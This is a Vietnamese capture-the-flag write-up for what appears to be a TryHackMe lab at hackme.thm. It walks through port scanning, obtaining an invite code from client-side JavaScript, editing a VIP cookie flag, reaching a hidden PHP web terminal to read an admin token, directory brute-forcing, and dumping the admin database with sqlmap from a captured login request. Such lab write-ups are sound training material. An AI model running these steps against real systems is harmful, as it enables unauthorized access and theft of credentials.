# 1. Trinh sát hệ thống (Port Enumeration)
Mục tiêu: Quét toàn bộ các cổng mạng để xác định các dịch vụ đang mở trên máy chủ mục tiêu.

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.112.167.121
```

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.112.167.121:22
Open 10.112.167.121:80
Open 10.112.167.121:8000
Open 10.112.167.121:8089
Open 10.112.167.121:8191
Open 10.112.167.121:40009
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-14 11:18 EDT
Initiating Ping Scan at 11:18
Scanning 10.112.167.121 [4 ports]
Completed Ping Scan at 11:18, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:18
Completed Parallel DNS resolution of 1 host. at 11:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:18
Scanning 10.112.167.121 [6 ports]
Discovered open port 8089/tcp on 10.112.167.121
Discovered open port 22/tcp on 10.112.167.121
Discovered open port 40009/tcp on 10.112.167.121
Discovered open port 80/tcp on 10.112.167.121
Discovered open port 8191/tcp on 10.112.167.121
Discovered open port 8000/tcp on 10.112.167.121
Completed SYN Stealth Scan at 11:18, 0.27s elapsed (6 total ports)
Nmap scan report for 10.112.167.121
Host is up, received reset ttl 62 (0.24s latency).
Scanned at 2026-10-14 11:18:44 EDT for 1s

PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack ttl 62
80/tcp    open  http           syn-ack ttl 62
8000/tcp  open  http-alt       syn-ack ttl 62
8089/tcp  open  unknown        syn-ack ttl 62
8191/tcp  open  limnerpressure syn-ack ttl 62
40009/tcp open  unknown        syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (304B)
```

Thực hiện: Chạy quét cổng toàn diện (Nmap) để phát hiện các dịch vụ quan trọng:

Port 80 (HTTP): Giao diện web chính của ứng dụng.

Port 8000: Giao diện SIEM Splunk (dùng cho giai đoạn phân tích log cuối bài).

Port 8089: Cổng quản lý ngầm của Splunkd.

Port 8191: Dịch vụ NoSQL/MongoDB phụ trợ.

Port 4009: Cổng trả về mã lỗi 403 Forbidden (bảo vệ thư mục).

# 2. Vượt qua mã mời (Invite Code Bypass)
Vấn đề: Trang đăng ký (Sign up) yêu cầu một Invite Code hợp lệ mà người dùng bình thường không có.

Tư duy chuyên gia (Client-Side Logic Flaw): Logic kiểm tra và cấp mã mời bị viết trực tiếp ở mã nguồn phía client (tệp JavaScript invite.js).

Cách giải quyết: Đọc mã nguồn JavaScript để tìm endpoint PHP xử lý sinh mã. Tiến hành gửi yêu cầu HTTP đúng ngữ cảnh nguồn (Domain/Origin) để đánh lừa hệ thống, từ đó lấy được mã mời, đăng ký thành công và đăng nhập bằng tài khoản guest.

```
function e(){
  var e=window.location.hostname;
  if(e==="capture3millionsubscribers.thm"){
    var o=new XMLHttpRequest;
    o.open("POST","inviteCode1337HM.php",true);
    o.onload=function(){
      if(this.status==200){
        console.log("Invite Code:",this.responseText)
      }else{
        console.error("Error fetching invite code.")
      };
    o.send()
  }else if(e==="hackme.thm"){
      console.log("This function does not operate on hackme.thm")
  }else{
      console.log("Lol!! Are you smart enought to get the invite code?")
  }
}
```
Lấy đc mã mời:
<img width="626" height="120" alt="image" src="https://github.com/user-attachments/assets/a7d73920-d324-4602-aeff-2b27d034def5" />

Nhập mã mới ta đc tài khoản và mật khẩu người dùng guest :
<img width="1375" height="487" alt="image" src="https://github.com/user-attachments/assets/ba60c078-496c-4525-a0ad-048306626445" />

Đăng nhập
<img width="1398" height="480" alt="image" src="https://github.com/user-attachments/assets/3b261c3f-0d5b-4691-8020-9a83c987bc06" />

# 3. Leo thang đặc quyền (Privilege Escalation & Web Shell)
Thay đổi trạng thái Session (Cookie Manipulation):

Tài khoản guest không thể truy cập các nội dung VIP. Khi kiểm tra bộ nhớ trình duyệt, hệ thống lưu biến trạng thái VIP: false.

Chuyên gia tiến hành sửa trực tiếp giá trị này thành VIP: true để mở khóa giao diện VIP phía client.

Khai thác Web Shell & Lộ tệp cấu hình:

Do nút bấm kích hoạt phòng lab bị lỗi giao diện iframe, chuyên gia trích xuất đường dẫn tệp PHP ẩn bên trong (advanced_timing.php) và truy cập trực tiếp để mở một Terminal dòng lệnh thu nhỏ trên web.

<img width="937" height="105" alt="image" src="https://github.com/user-attachments/assets/18f71e80-79dc-4686-9c16-ec70c80d7408" />

<img width="847" height="342" alt="image" src="https://github.com/user-attachments/assets/2854f82c-d8ab-454b-ac54-41b609695987" />

Đọc tệp cấu hình config.php thông qua terminal bị giới hạn này để thu thập Access Token quản trị và đường dẫn đến trang quản trị viên (Admin panel).

Phát hiện 1 đường link `http://admin1337special.hackme.thm:40009` thêm cào file `/etc/hosts`. Sau đó thực hiện `gobuster` ta đc
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://admin1337special.hackme.thm:40009/public/html/ -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin1337special.hackme.thm:40009/public/html/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/dashboard            (Status: 403) [Size: 0]
/login                (Status: 200) [Size: 1662]
/logout               (Status: 200) [Size: 154]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

# 4. Khai thác lỗ hổng SQL Injection (SQLmap Automation)
Bắt gói tin (Request Capture): Sử dụng Proxy để chặn gói tin POST tại trang đăng nhập admin và lưu thành tệp request.txt.
```                                         
POST /api/login.php HTTP/1.1
Host: admin1337special.hackme.thm:40009
Content-Length: 37
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://admin1337special.hackme.thm:40009
Referer: http://admin1337special.hackme.thm:40009/public/html/login
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f6u0eehumfcs14t5qp680lkafv
Connection: keep-alive

{"username":"abc","password":"admin"}
```

Thực thi lệnh khai thác tự động:
```
Bash
sqlmap -r request.txt --dump
```
Giải thích lệnh:

`-r request.txt`: Nạp gói tin HTTP thô chứa toàn bộ header, cookie và tham số cần kiểm tra mà không cần cấu hình thủ công.
`--dump`: Tự động tìm kiếm điểm tiêm nhiễm SQLi và trích xuất toàn bộ cơ sở dữ liệu, các bảng, cột cùng dữ liệu người dùng (tài khoản/mật khẩu quản trị).

Kết quả: Trích xuất thành công cơ sở dữ liệu hackme và lấy được thông tin đăng nhập tài khoản quản trị (admin).

<img width="1093" height="187" alt="image" src="https://github.com/user-attachments/assets/8a50345c-4b3d-4b66-99ea-042c4ed45910" />

<img width="781" height="320" alt="image" src="https://github.com/user-attachments/assets/d834e7e5-e4d0-4c9b-90c4-80b4a6480c3e" />
